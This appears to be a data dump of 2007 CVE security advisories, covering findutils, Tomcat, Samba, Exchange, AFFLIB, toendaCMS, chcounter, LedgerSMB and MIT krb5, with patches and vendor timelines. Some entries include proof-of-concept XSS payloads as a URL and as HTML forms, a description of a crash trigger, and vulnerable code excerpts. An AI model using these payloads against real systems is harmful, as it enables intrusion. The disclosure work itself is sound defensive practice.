available at ftp://ftp.gnu.org/gnu/findutils/findutils-4.2.31.tar.gz.
This patch also fixes the problem and should apply to findutils-4.2.23
and later. Findutils-4.2.23 was released almost two years ago.
Index: locate/locate.c
===================================================================
RCS file: /cvsroot/findutils/findutils/locate/locate.c,v
retrieving revision 1.58.2.2
diff -u -p -r1.58.2.2 locate.c
--- locate/locate.c 22 Apr 2007 16:57:42 -0000 1.58.2.2
+++ locate/locate.c 28 May 2007 10:18:16 -0000
@@ -124,9 +124,9 @@ extern int errno;
#include ""locatedb.h""
#include <getline.h>
-#include ""../gnulib/lib/xalloc.h""
-#include ""../gnulib/lib/error.h""
-#include ""../gnulib/lib/human.h""
+#include ""xalloc.h""
+#include ""error.h""
+#include ""human.h""
#include ""dirname.h""
#include ""closeout.h""
#include ""nextelem.h""
@@ -468,10 +468,36 @@ visit_justprint_unquoted(struct process_
return VISIT_CONTINUE;
}
+static void
+toolong (struct process_data *procdata)
+{
+ error (1, 0,
+ _(""locate database %s contains a ""
+ ""filename longer than locate can handle""),
+ procdata->dbfile);
+}
+
+static void
+extend (struct process_data *procdata, size_t siz1, size_t siz2)
+{
+ /* Figure out if the addition operation is safe before performing it. */
+ if (SIZE_MAX - siz1 < siz2)
+ {
+ toolong (procdata);
+ }
+ else if (procdata->pathsize < (siz1+siz2))
+ {
+ procdata->pathsize = siz1+siz2;
+ procdata->original_filename = x2nrealloc (procdata->original_filename,
+ &procdata->pathsize,
+ 1);
+ }
+}
+
static int
visit_old_format(struct process_data *procdata, void *context)
{
- register char *s;
+ register size_t i;
(void) context;
/* Get the offset in the path where this path info starts. */
@@ -479,20 +505,35 @@ visit_old_format(struct process_data *pr
procdata->count += getw (procdata->fp) - LOCATEDB_OLD_OFFSET;
else
procdata->count += procdata->c - LOCATEDB_OLD_OFFSET;
+ assert(procdata->count > 0);
- /* Overlay the old path with the remainder of the new. */
- for (s = procdata->original_filename + procdata->count;
+ /* Overlay the old path with the remainder of the new. Read
+ * more data until we get to the next filename.
+ */
+ for (i=procdata->count;
(procdata->c = getc (procdata->fp)) > LOCATEDB_OLD_ESCAPE;)
- if (procdata->c < 0200)
- *s++ = procdata->c; /* An ordinary character. */
- else
- {
- /* Bigram markers have the high bit set. */
- procdata->c &= 0177;
- *s++ = procdata->bigram1[procdata->c];
- *s++ = procdata->bigram2[procdata->c];
- }
- *s-- = '';
+ {
+ if (procdata->c < 0200)
+ {
+ /* An ordinary character. */
+ extend (procdata, i, 1u);
+ procdata->original_filename[i++] = procdata->c;
+ }
+ else
+ {
+ /* Bigram markers have the high bit set. */
+ extend (procdata, i, 2u);
+ procdata->c &= 0177;
+ procdata->original_filename[i++] = procdata->bigram1[procdata->c];
+ procdata->original_filename[i++] = procdata->bigram2[procdata->c];
+ }
+ }
+
+ /* Consider the case where we executed the loop body zero times; we
+ * still need space for the terminating null byte.
+ */
+ extend (procdata, i, 1u);
+ procdata->original_filename[i] = 0;
procdata->munged_filename = procdata->original_filename;
VIII. THANKS
============
Thanks to Rob Holland <rob inversepath com> and Tavis Ormandy.
VIII. CVE INFORMATION
=====================
The identifier CVE-2007-2452 been assigned for this issue."
25371,[CVE-2007-1355] Tomcat documentation XSS vulnerabilities,,CVE-2007-1355,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-1355: Tomcat documentation XSS vulnerabilities
Severity:
Moderate (Cross-site scripting)
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.0.0 to 4.0.6
Tomcat 4.1.0 to 4.1.36
Tomcat 5.0.0 to 5.0.30
Tomcat 5.5.0 to 5.5.23
Tomcat 6.0.0 to 6.0.10
Description:
The Tomcat documentation web application includes a sample application
that contains multiple XSS vulnerabilities.
Mitigation:
Undeploy the Tomcat documentation web application.
Credit:
These issues were discovered by Ferruh Mavituna.
Example:
http://server/tomcat-docs/appdev/sample/web/hello.jsp?test=<script>alert(document.domain)</script>
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGTxLXb7IeiTPGAkMRAhPzAKDxibK3Cn9Dq+2ZrlhZszmwPAJufACfdvjv
AH8zWtQXPUbBVgDS+6KoNOE=
=/6Zd
-----END PGP SIGNATURE-----"
25447,[SAMBA-SECURITY] CVE-2007-2447: Remote Command Injection Vulnerability,,CVE-2007-2447,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
==========================================================
==
== Subject: Remote Command Injection Vulnerability
== CVE ID#: CVE-2007-2447
==
== Versions: Samba 3.0.0 - 3.0.25rc3 (inclusive)
==
== Summary: Unescaped user input parameters are passed
== as arguments to /bin/sh allowing for remote
== command execution
==
==========================================================
===========
Description
===========
This bug was originally reported against the anonymous calls
to the SamrChangePassword() MS-RPC function in combination
with the ""username map script"" smb.conf option (which is not
enabled by default).
After further investigation by Samba developers, it was
determined that the problem was much broader and impacts
remote printer and file share management as well. The root
cause is passing unfiltered user input provided via MS-RPC
calls to /bin/sh when invoking externals scripts defined
in smb.conf. However, unlike the ""username map script""
vulnerability, the remote file and printer management scripts
require an authenticated user session.
==================
Patch Availability
==================
A patch against Samba 3.0.24 has been posted at
http://www.samba.org/samba/security/
==========
Workaround
==========
This defect may be alleviated by removing all defined
external script invocations (username map script, add
printer command, etc...) from smb.conf.
The Samba Team always encourages users to run the latest
stable release as a defense against attacks. If this
is not immediately possible, administrators should read
the ""Server Security"" documentation found at
http://www.samba.org/samba/docs/server_security.html
=======
Credits
=======
This vulnerability was discovered by an anonymous researcher
and reported to Samba developers by Joshua J. Drake, iDefense
Labs (http://www.idefense.com/), as part of their Vulnerability
Contributor Program.
The time line is as follows:
* May 7, 2007: Initial defect disclosure to the security samba org
email alias.
* May 7, 2007: Initial developer response by Samba
developer Gerald Carter.
* May 9, 2007: Patch released by Samba developer Jeremy
Allison to iDefense for testing.
* May 10, Announcement to vendor-sec mailing list
* May 14, 2007: Public announcement of the security issue.
==========================================================
== Our Code, Our Bugs, Our Responsibility.
== The Samba Team
==========================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGR5YAIR7qMdg1EfYRAn91AKDpPgSVlYSbMEkxpIAWG9rD1Cl6kwCffrRO
VCdq+1LtZsACYv7Yt1sQKyE=
=wtvM
-----END PGP SIGNATURE-----"
25448,[SAMBA-SECURITY] CVE-2007-2446: Multiple Heap Overflows Allow Remote Code Execution,,CVE-2007-2446,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
==========================================================
==
== Subject: Multiple Heap Overflows Allow Remote
== Code Execution
== CVE ID#: CVE-2007-2446
==
== Versions: Samba 3.0.0 - 3.0.25rc3 (inclusive)
==
== Summary: Various bugs in Samba's NDR parsing
== can allow a user to send specially
== crafted MS-RPC requests that will
== overwrite the heap space with user
== defined data.
==
==========================================================
===========
Description
===========
Various bugs in Samba's NDR parsing can allow a user
to send specially crafted MS-RPC requests that will
overwrite the heap space with user defined data.
==================
Patch Availability
==================
A patch against Samba 3.0.24 has been posted at
http://www.samba.org/samba/security/
==========
Workaround
==========
There is no immediate workaround for this defect that does
not involve changing the server code in the smbd daemon.
The Samba Team always encourages users to run the latest
stable release as a defense against attacks. If this
is not immediately possible, administrators should read
the ""Server Security"" documentation found at
http://www.samba.org/samba/docs/server_security.html
=======
Credits
=======
This vulnerability was reported to Samba developers by Brian
Schafer, TippingPoint Security Response Lead, as part
of the Zero Day Initiative (http://www.zerodayinitiative.com).
The time line is as follows:
* April 25, 2007: Four individual defects reported to the
security samba org email alias.
* April 25, 2007: Initial developer response by Samba
developer Volker Lendecke.
* April 28, 2007: Patches for four defects released by
Samba developer Jeremy Allison to ZDI for testing.
* May 3, 2007: Fixed confirmed by original reporter.
* May 5, 2007: Fifth defect reported to security samba org.
* May 5, 2007: Patches for fifth defects released to ZDI
for testing by Samba developer Jeremy Allison.
* May 10, Announcement to vendor-sec mailing list
* May 14, 2007: Public announcement of the security issue.
==========================================================
== Our Code, Our Bugs, Our Responsibility.
== The Samba Team
==========================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGR5XYIR7qMdg1EfYRAt3rAJ9fF3obUfyUBxr46Qx7RJSY+aDCzACgivcK
oBThjTk/tZkqjRMuVYSiT8g=
=Qzo8
-----END PGP SIGNATURE-----"
25449,[SAMBA-SECURITY] CVE-2007-2444: Local SID/Name Translation Failure Can Result in User Privilege Elevation,,CVE-2007-2444,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
==========================================================
==
== Subject: Local SID/Name translation bug can result
== in user privilege elevation
== CVE ID#: CVE-2007-2444
==
== Versions: Samba 3.0.23d - 3.0.25pre2 (inclusive)
==
== Summary: A bug in the local SID/Name translation
== routines may potentially result in a user
== being able to issue SMB/CIFS protocol
== operations as root.
==
==========================================================
===========
Description
===========
When translating SIDs to/from names using Samba local
list of user and group accounts, a logic error in the
smbd daemon's internal security stack may result in a
transition to the root user id rather than the non-root
user. The user is then able to temporarily issue SMB/CIFS
protocol operations as the root user. This window of
opportunity may allow the attacker to establish additional
means of gaining root access to the server.
==================
Patch Availability
==================
A patch against Samba 3.0.23d/3.0.24 has posted at
http://www.samba.org/samba/security/
==========
Workaround
==========
There is no immediate workaround for this defect that does
not involve changing the server code in the smbd daemon.
The Samba Team always encourages users to run the latest
stable release as a defense against attacks. If this
is not immediately possible, administrators should read
the ""Server Security"" documentation found at
http://www.samba.org/samba/docs/server_security.html
=======
Credits
=======
This vulnerability was reported to Samba developers by Paul
Griffith <paulg cse yorku ca> and Andrew Hogue. Much thanks
to Paul and Andrew for their cooperation and patience in the
announcement of this defect. Thanks also to Samba developers
James Peach and Jeremy Allison for the analysis and resolution
of this issue.
The time line is as follows:
* March 20, 2007: Defect first reported to the security samba org
email alias.
* March 30, 2007: Initial developer response by Gerald Carter.
* April 4, 2007: Patch released to bug reporter for testing.
* April 9, 2007: Fixed confirmed by original reporter.
* May 3, 2007: Announcement to vendor-sec mailing list
* May 14, 2007: Public announcement of the security issue.
==========================================================
== Our Code, Our Bugs, Our Responsibility.
== The Samba Team
==========================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGR5W7IR7qMdg1EfYRAsv9AJ9KfUWTcyiDhLEDeIKJFGXaAWvk1gCff+0j
FFgPmJhGBosBPSadj+bPpgw=
=ruFz
-----END PGP SIGNATURE-----"
25507,Exchange Calendar MODPROPS Denial of Service (CVE-2007-0039),,CVE-2007-0039,"Determina Security Research
Exchange Calendar MODPROPS Denial of Service
http://www.determina.com/security.research/vulnerabilities/exchange-ical-modprops.html
CVE ID: CVE-2007-0039
MS ID: MS07-026
Vendor notification: Dec 20, 2006
Vendor patch: May 8, 2007
Systems Affected:
* Exchange 2000
* Exchange 2003
Overview:
Determina Security Research has discovered a denial of service vulnerability in
the code responsible for parsing iCal email attachments in Microsoft Exchange.
This vulnerability can be exploited by a malicious email message and results in
a denial of service. The vulnerable code is present in Exchange 2000 and 2003.
Microsoft fixed a related vulnerability with the MS06-019 security update, but
their fix introduced a new denial of service bug. Determina Security Research
was able to develop a proof-of-concept exploit that works against fully-patched
Exchange servers.
Technical Details:
The iCal file format is described in detail in RFC2445. The file consists of a
series of records, delimited by BEGIN and END tags. Each record can have
multiple named properties. The iCal parser in Exchange maintains a table of
properties valid in the current context and switches to the appropriate table
upon entering a new record.
The X-MICROSOFT-CDO-MODPROPS property is an undocumented Microsoft extension
which allows the iCal file to specify a list of properties that are considered
valid in a specific record. All other properties will be ignored by Exchange.
The following example shows a typical usage of this feature:
BEGIN:VEVENT
X-MICROSOFT-CDO-MODPROPS:BEGIN,DTEND,DTSTART,END
DTSTART:19970714T170000Z
DTEND:19970715T035959Z
SUMMARY:Bastille Day Party
END:VEVENT
In this example, the SUMMARY property will not be processed by Exchange.
When the parser encounters the MODPROPS property, it calls
CICalSchema::AllocPropTables to allocate a new table of valid properties. The
pointer to the new table is stored in this->field_F0 and the list of valid
properties is copied into the table. If there is a second MODPROPS property, the
function will be called again and will reuse the previousely allocated table. If
the second MODPROPS element is longer than the first one, the copy loop will
write past the end of the table.
This vulnerability was fixed in MS06-019 by adding a call to
CICalSchema::FreePropTables in the beginning of the AllocPropTables function.
This ensures that the previous property table is freed and AllocPropTables
allocates a new one of sufficient size.
Unfortunately, FreePropTables also sets the this->field_28 pointer to NULL. The
NULL pointer is later used in a memcpy operation in AllocPropTables and causes
an unhandled exception, resulting in a crash of Exchange.
// Allocate a new property table
int CICalSchema::AllocPropTables(arg_0, arg_4)
{
this->FreePropTables();
...
// Allocate space for the new table
if (this->field_F0 == NULL)
this->field_F0 = new(vector_size*16);
...
// NULL pointer dereference of this->field_28
memcpy(&this->field_F4[offset_F4], &this->field_28[index*20], 20);
}
// Free the property table
void CICalSchema::FreePropTables()
{
if (this->field_F0 != NULL) {
...
ExFree(this->field_F0);
this->field_F0 = NULL;
}
if (this->field_F4 != NULL) {
if (this->field_28 == this->field_F4) {
this->field_28 = NULL; // set this->field_28 to NULL
this->field_1C = 0;
}
ExFree(this->field_F4);
this->field_F4 = NULL;
}
...
}
Protection:
Determina VPS Server protects against the exploitation of this vulnerability.
Vendor response:
Microsoft issued the MS07-026 patch on May 8, 2007.
Credit:
Discovery: Alexander Sotirov, Determina Security Research"
25618,"Re: please retract CVE-2007-2056 ""Time-of-Check-Time-of-Use File Race in AFFLIB""",,CVE-2007-2056,"Hello Simson,
> Please issue a statement retracting your ""security vulnerability""
> CV2-2007-2056.
>
> Your alleged vulnerability in aimage is not a bug because the
> function getlock() is never called.
You are correct. I sincerely appologize for not catching this. This
function is not called in versions 2.2.0 or 2.2.8. This correction has
been made on our website along with some others. For more information,
see:
http://www.vsecurity.com/bulletins/advisories/2007/afflib-toctou.txt
http://www.vsecurity.com/bulletins/advisories/2007/afflib-overflows.txt
http://www.vsecurity.com/bulletins/advisories/2007/afflib-shellinject.txt
http://www.vsecurity.com/bulletins/advisories/2007/afflib-fmtstr.txt
We are currently aware of no other exploitable flaws in AFFLIB.
thank you for validating our claims,
tim"
25619,"please retract CVE-2007-2056 ""Time-of-Check-Time-of-Use File Race in AFFLIB""",,CVE-2007-2056,"Dear Tim,
Please issue a statement retracting your ""security vulnerability"" CV2-2007-2056.
Your alleged vulnerability in aimage is not a bug because the function getlock() is never called.
Although I appreciate the fact that you have done a security audit on my code, many of the bugs that you identified as ""security vulnerabilities"" were not vulnerabilities because there was no way to exploit them. And in this case, you have merely identified a bug in code that is not even callable.
I understand that it's exciting to get your name out there as a ""security researcher,"" but I think that there are better targets from which to choose.
Sincerely,
Simson Garfinkel
Virtual Security Research, LLC.
http://www.vsecurity.com/
Security Advisory
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Advisory Name: Time-of-Check-Time-of-Use File Race in AFFLIB
Release Date: 2007-04-27
Application: AFFLIB(TM)
Versions: 2.2.0-2.2.8 and likely earlier versions.
Severity: Low
Author: Timothy D. Morgan <tmorgan {at} vsecurity {dot} com>
Vendor Status: Vendor Notified
CVE Candidate: CVE-2007-2056
Reference:
http://www.vsecurity.com/bulletins/advisories/2007/afflib-toctou.txt
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Product Description:
> From the forensicswiki.org website[1]:
""The Advanced Forensics Format (AFF) is an extensible open format for
the storage of disk images and related forensic metadata. It was
developed by Simson Garfinkel and Basis Technology.""
AFFLIB(TM) is the reference implementation of the AFF(TM) format,
written primarily by Simson Garfinkel. It comes in the form of an open
source library and a set of command line tools used to manipulate
AFF(TM) files.
Vulnerability Overview:
In mid-March, 2007 Virtual Security Research, LLC (VSR) performed a
security code review of AFFLIB(TM) as a part of an internal tool
assessment process. As a result, multiple vulnerabilities of varying
severities were discovered. The most significant of these
vulnerabilities are being announced publicly to raise awareness and help
end-users secure themselves against potential attack.
A time-of-check-time-of-use race was discovered in AFFLIB(TM) which
could allow an attacker on the local machine to overwrite an arbitrary
file. Because the content of the file would not be controllable by an
attacker, it is unlikely that this is vulnerability is exploitable for
more than a denial-of-service.
This vulnerability remains in the latest version (2.2.8) despite several
notifications to the vendor. All line numbers listed below are from
version 2.2.0.
Vulnerability Details:
File: aimage/aimage.cpp
Lines: 554-575
Platforms Affected: Unix
Description:
A mostly predictable name for the lockfile as it is created under
/tmp. An access check is first performed, and later the file is opened,
truncating if it already exists. Since the time of check and time of use
are not the same, a filesystem race could be exploited by a local
attacker through the use of a symlink. Lines 548-582 are included below
to illustrate the problem:
int getlock(class imager *im)
{
/* If the file exists and the PID in the file is running,
* can't get the lock.
*/
char lockfile[MAXPATHLEN];
sprintf(lockfile,""/tmp/aimge.%s.lock"",im->infile);
if(access(lockfile,F_OK)==0){
/* Lockfile exists. Get it's pid */
char buf[1024];
FILE *f = fopen(lockfile,""r"");
if(!f){
perror(lockfile); // can't read lockfile...
return -1;
}
fgets(buf,sizeof(buf),f);
buf[sizeof(buf)-1] = 0;
int pid = atoi(buf);
if(checkpid(pid)==0){
/* PID is not running; we can delete the lockfile */
if(unlink(lockfile)){
err(1,""could not delete lockfile %s: "",lockfile);
}
}
/* PID is running; generate error */
errx(1,""%s is locked by process %d "",im->infile,pid);
}
FILE *f = fopen(lockfile,""w"");
if(!f){
err(1,lockfile);
}
fprintf(f,""%d "",getpid()); // save our PID.
fclose(f);
return 0;
}
This is likely only exploitable for a denial-of-service condition, since
the attacker would have little control over the content being written
(the process ID of aimage).
Vendor Response:
Simson Garfinkel was first contacted on 2007-03-31. The following
timeline outlines the responses from the vendor regarding this issue:
2007-04-01 - Vendor provided details of all vulnerabilities
identified.
2007-04-03 - Continued vendor communication.
2007-04-05 - Vendor released version 2.2.6, containing multiple
security fixes.
2007-04-06 - Vendor notified VSR that fixes were released.
2007-04-09 - VSR notified vendor that 9 vulnerability instances still
remained in latest release.
2007-04-12 - Vendor confirmed that remaining vulnerabilities would be
fixed in next release.
2007-04-25 - Vendor released versions 2.2.7 and 2.2.8. Vendor did not
notify VSR.
2007-04-27 - VSR discovered new versions were released. VSR inspected
version 2.2.8 and found that no additional vulnerabilities
were fixed. VSR advisories published.
Recommendation:
AFFLIB(TM) users should upgrade to the newest version. Third-party
projects which rely on AFFLIB(TM) should encourage users to upgrade,
and/or incorporate fixes into their distribution of the library.
The update is available via:
http://www.afflib.org/downloads/
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Common Vulnerabilities and Exposures (CVE) Information:
The Common Vulnerabilities and Exposures (CVE) project has assigned
the following name to this issue. This is a candidate for inclusion in
the CVE list (http://cve.mitre.org), which standardizes names for
security problems.
CVE-2007-2056
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
References:
1. AFF - Forensics Wiki
http://www.forensicswiki.org/wiki/AFF
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
This advisory is distributed for educational purposes only, and comes
with absolutely NO WARRANTY; not even the implied warranty of
merchantability or fitness for a particular purpose. Virtual Security
Research, LLC nor the author accepts any liability for any direct,
indirect, or consequential loss or damage arising from use of, or
reliance on, this information.
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Vulnerability Disclosure Policy:
http://www.vsecurity.com/disclosurepolicy.html
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
AFF(TM) and AFFLIB(TM) are trademarks of Simson Garfinkel and Basis
Technology Corp.
Included source code excerpts are copyright Simson Garfinkel and Basis
Technology Corp.
This advisory is copyright (C) 2007 Virtual Security Research, LLC. All
rights reserved."
25878,CVE-2007-1872: Cross site scripting in toendaCMS 1.5.3,,CVE-2007-1872,"Cross site scripting in toendaCMS 1.5.3
security advisory
References:
http://www.toendacms.com/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1872
Description:
Cross site scripting describes attacks that allow to insert malicious
html or javascript code via get or post forms. This can be used to steal
session cookies.
toendacms is a content management system. The search function can be used
to inject javascript code.
Workaround/Fix:
There's no vendor fix.
Vendor has been contacted 2007-03-11 and replied that they were working on
the issue.
Sample Code:
<form action=""http://toendainstallation/"" method=""post"">
<input type=""hidden"" name=""searchword"" value='""><script>alert(1)</script>'>
<input type=""hidden"" name=""id"" value=""search"">
<input type=""submit""></form>
CVE Information:
The Common Vulnerabilities and Exposures (CVE) project has assigned the
name CVE-2007-1872 to this issue. This is a candidate for inclusion in
the CVE list (http://cve.mitre.org/), which standardizes names for
security problems.
Credits and copyright:
This vulnerability was discovered by Hanno Boeck of schokokeks.org
webhosting.
It's licensed creative commons attribution:
http://creativecommons.org/licenses/by/3.0/
Hanno Boeck, 2007-04-12, http://www.hboeck.de"
25879,CVE-2007-1871: Cross site scripting in chcounter 3.1.3,,CVE-2007-1871,"Cross site scripting in chcounter 3.1.3
security advisory
References:
http://chcounter.org/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1871
Description:
Cross site scripting describes attacks that allow to insert malicious
html or javascript code via get or post forms. This can be used to steal
session cookies.
chcounter is some free software php script for website statistics. The
login form on the start page can be used to insert javascript code.
Workaround/Fix:
There's no vendor fix.
Vendor has been contacted 2007-03-11 and has not answered yet.
Sample Code:
<form method=post action=http://chcounterinstallation/stats/>
<input type=hidden name=login_name value='""><script>alert(1)</script>'>
<input type=submit>
</form>
CVE Information:
The Common Vulnerabilities and Exposures (CVE) project has assigned the
name CVE-2007-1871 to this issue. This is a candidate for inclusion in
the CVE list (http://cve.mitre.org/), which standardizes names for
security problems.
Credits and copyright:
This vulnerability was discovered by Hanno Boeck of schokokeks.org
webhosting.
It's licensed creative commons attribution:
http://creativecommons.org/licenses/by/3.0/
Hanno Boeck, 2007-04-12, www.hboeck.de"
25954,"LedgerSMB 1.2.0 finally released, fixes CVE-2006-5589",,CVE-2006-5589,"LedgerSMB 1.2.0 has been released, completing a comprehensive SQL injection audit of the code inherited from SQL-Ledger. Numerous SQL injection issues were fixed. In fact, most fields were not properly quoted and escaped. These problems should affect all known versions of SQL-Ledger as well. The fix was delayed because the scale of the changes made required extensive testing-- these were not trivial changes.
Users are advised to upgrade as soon as possible. However, one should also note that (as we have documented in our manual), user permissions are not yet strictly enforced. Therefore, the current recommendation that database user accounts are used to enforce privilege separation still holds.
Those who maintain security advisory lists should list CVE-2006-5589 as now officially closed for LedgerSMB, though it is likely to remain open for SQL-Ledger.
Best Wishes,
Chris Travers"
26007,MITKRB5-SA-2007-003: double-free vulnerability in kadmind (via GSS-API library) [CVE-2007-1216],,CVE-2007-1216,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MIT krb5 Security Advisory 2007-003
Original release: 2007-04-03
Last update: 2007-04-03
Topic: double-free vulnerability in kadmind (via GSS-API library)
Severity: CRITICAL
CVE: CVE-2007-1216
CERT: VU#419344
SUMMARY
=======
The MIT krb5 Kerberos administration daemon (kadmind) is vulnerable to
a double-free attack in the RPCSEC_GSS authentication flavor of the
RPC library, which itself results from a bug in the GSS-API library.
Under some error conditions, the krb5 GSS-API mechanism can free a
buffer which an application may then free again. This may result in
arbitrary code execution. Third-party applications using the GSS-API
library provided with MIT krb5 may also be vulnerable.
Exploitation of double-free bugs is believed to be difficult.
This is a bug in the GSS-API library included with MIT krb5, which is
used by kadmind and by some third-party applications. It is not a bug
in the Kerberos protocol.
IMPACT
======
An authenticated user may be able to cause a host running kadmind to
execute arbitrary code.
Successful exploitation can compromise the Kerberos key database and
host security on the host running these programs. (kadmind and the
KDC typically run as root.) Unsuccessful exploitation attempts will
likely result in the affected program crashing.
Third-party applications calling either the RPC library or the GSS-API
library provided with MIT krb5 may be vulnerable.
AFFECTED SOFTWARE
=================
* kadmind from MIT releases krb5-1.4 through krb5-1.6
* third-party applications calling the RPC library included in MIT
releases krb5-1.4 through krb5-1.6
* kadmind and third-party applications calling the RPC library in MIT
releases earlier than krb5-1.4 may not be vulnerable because the
RPCSEC_GSS authentication flavor was not implemented in those RPC
libraries.
* third-party applications calling the GSS-API library included in any
MIT krb5 releases, up to and including krb5-1.6, if the application
handles GSS-API errors in a certain way
FIXES
=====
* The upcoming krb5-1.6.1 release will contain a fix for this
vulnerability.
Prior to that release you may:
* apply the patch
Note that releases prior to krb5-1.3 will require a different patch
due to an additional related vulnerability in the same file.
This patch is also available at
http://web.mit.edu/kerberos/advisories/2007-003-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2007-003-patch.txt.asc
*** src/lib/gssapi/krb5/k5unseal.c (revision 19510)
- --- src/lib/gssapi/krb5/k5unseal.c (revision 19511)
***************
*** 457,464 ****
if ((ctx->initiate && direction != 0xff) ||
(!ctx->initiate && direction != 0)) {
! if (toktype == KG_TOK_SEAL_MSG)
xfree(token.value);
*minor_status = G_BAD_DIRECTION;
return(GSS_S_BAD_SIG);
}
- --- 457,467 ----
if ((ctx->initiate && direction != 0xff) ||
(!ctx->initiate && direction != 0)) {
! if (toktype == KG_TOK_SEAL_MSG) {
xfree(token.value);
+ message_buffer->value = NULL;
+ message_buffer->length = 0;
+ }
*minor_status = G_BAD_DIRECTION;
return(GSS_S_BAD_SIG);
}
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2007-003.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVE: CVE-2007-1216
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1216
CERT: VU#419344
http://www.kb.cert.org/vuls/id/419344
ACKNOWLEDGMENTS
===============
This bug was found while exercising the GSS-API library using the
GSSTEST test program provided by SAP AG.
Shiva Persaud of IBM alerted us to an ambiguity in the wording of a
draft of this advisory.
DETAILS
=======
The kg_unseal_v1() function in src/lib/gssapi/krb5/k5unseal.c frees
memory allocated for the ""message_buffer"" gss_buffer_t when it detects
an invalid direction encoding on the message. It does not set the
pointer to NULL, nor does it set the length to zero. An application
subsequently calling gss_release_buffer() on this gss_buffer_t will
cause memory to be freed twice.
Much code provided with MIT krb5 does not attempt to call
gss_release_buffer() when gss_unseal() or gss_unwrap() fails, even
though the GSS-API C-bindings specification permits it to do so. The
RPCSEC_GSS authentication flavor for the RPC library, introduced in
krb5-1.4, does call gss_release_buffer() when gss_unwrap() fails.
This allows an authenticated attacker to trigger a double-free
situation.
Third-party applications calling the RPC library provided with MIT
krb5 and using the RPCSEC_GSS authentication flavor are vulnerable.
Third-party applications calling the MIT GSS-API library are
vulnerable if they call gss_release_buffer() when they experience
errors from gss_unseal() or gss_unwrap().
REVISION HISTORY
================
2007-04-03 original release
Copyright (C) 2007 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (SunOS)
iQCVAwUBRhKVU6bDgE/zdoE9AQJS0gP/fieb8glCvyZHOiJkVRGGbtzzSPC2RcHN
IkuF+aJo+KaKSFE+aKjce6Yx8jbOeqXx6CJe6UivGwXr1yyp31dh4B92N+3kMJlk
bsNlmNJOg2iOAo+YTINokfIwsYZSWcAv1UVjhTYlev0sn9IdI/a1NNhNpIvkSDg0
NdPwbLy4wi8=
=MwHB
-----END PGP SIGNATURE-----"
26008,"MITKRB5-SA-2007-002: KDC, kadmind stack overflow in krb5_klog_syslog [CVE-2007-0957]",,CVE-2007-0957,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MIT krb5 Security Advisory 2007-002
Original release: 2007-04-03
Last update: 2007-04-03
Topic: KDC, kadmind stack overflow in krb5_klog_syslog
Severity: CRITICAL
CVE: CVE-2007-0957
CERT: VU#704024
SUMMARY
=======
The library function krb5_klog_syslog() can write past the end of a
stack buffer. The Kerberos administration daemon (kadmind) as well as
the KDC, are vulnerable. Exploitation of this vulnerability is
probably simple.
This is a vulnerability in the the kadm5 library, which is used by the
KDC and kadmind, and possibly by some third-party applications. It is
not a bug in the MIT krb5 protocol libraries or in the Kerberos
protocol.
IMPACT
======
An authenticated user may be able to cause a host running kadmind to
execute arbitrary code.
An authenticated user may be able to cause a KDC host to execute
arbitrary code. Also, a user controlling a Kerberos realm sharing a
key with the target realm may be able to cause a KDC host to execute
arbitrary code.
Successful exploitation can compromise the Kerberos key database and
host security on the host running these programs. (kadmind and the
KDC typically run as root.) Unsuccessful exploitation attempts will
likely result in the affected program crashing.
Third-party applications which call krb5_klog_syslog() may also be
vulnerable.
AFFECTED SOFTWARE
=================
* MIT krb5 releases through krb5-1.6
FIXES
=====
* The upcoming krb5-1.6.1 release will contain a fix for this
vulnerability.
Prior to that release you may:
* apply the patch
The patch is available at
http://web.mit.edu/kerberos/advisories/2007-002-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2007-002-patch.txt.asc
Systems which definitely provide vsnprintf() may not need the entire
